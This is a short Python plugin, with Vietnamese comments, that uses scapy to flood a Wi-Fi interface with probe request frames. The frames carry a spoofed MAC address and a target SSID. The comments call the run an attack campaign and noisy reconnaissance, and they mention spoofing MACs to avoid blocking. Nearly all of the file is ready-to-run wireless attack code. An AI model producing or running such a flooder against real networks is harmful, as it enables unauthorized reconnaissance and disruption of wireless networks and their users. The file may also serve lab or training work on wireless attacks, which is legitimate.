# plugins/probe_flood.py
import sys
import time
from scapy.all import RadioTap, Dot11, Dot11ProbeReq, Dot11Elt, sendp

def main():
    if len(sys.argv) < 4:
        print("[-] Lỗi: Thiếu tham số.")
        sys.exit(1)
        
    interface = sys.argv[1]
    target_ssid = sys.argv[2]
    count = int(sys.argv[3])
    
    # Kẻ tấn công thường dùng MAC ngẫu nhiên để tránh bị block
    fake_mac = "00:11:22:33:44:55" 

    print("[*] Bắt đầu chiến dịch: Probe Request Flood (Trinh sát ồn ào)")
    print(f"    - Tìm kiếm SSID: {target_ssid}")
    
    # Tạo gói tin Probe Request thật
    dot11 = Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff", addr2=fake_mac, addr3="ff:ff:ff:ff:ff:ff")
    probe_req = RadioTap() / dot11 / Dot11ProbeReq() / Dot11Elt(ID="SSID", info=target_ssid)
    
    try:
        # 1. TẤN CÔNG THẬT: Bắn gói tin ra không gian
        print(f"[+] Đang bơm {count} gói Probe Request...")
        
        # Bắn liên tục theo số lượng yêu cầu
        sendp(probe_req, iface=interface, count=count, inter=0.05, verbose=False)
            
        print(f"[+] Hoàn tất trinh sát.")
            
    except KeyboardInterrupt:
        print("\n[!] Dừng chiến dịch.")

if __name__ == "__main__":
    main()